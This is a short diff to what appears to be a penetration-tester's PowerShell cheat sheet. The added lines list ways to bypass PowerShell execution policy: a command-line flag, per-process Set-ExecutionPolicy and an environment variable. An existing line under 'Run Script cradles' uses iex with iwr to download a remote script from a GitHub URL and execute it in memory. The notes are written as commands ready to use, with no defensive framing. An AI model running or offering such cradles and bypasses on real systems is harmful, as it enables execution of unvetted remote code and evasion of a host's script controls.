@@ -1,3 +1,14 @@
+# Bypass EP
+Start PowerShell from cmd.exe:
+powershell.exe -ep bypass
+
+OR If already running-
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted
+$Env:PSExecutionPolicyPreference = 'Bypass'
+
+
 # Run Script cradles
 
 iex (iwr "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1")
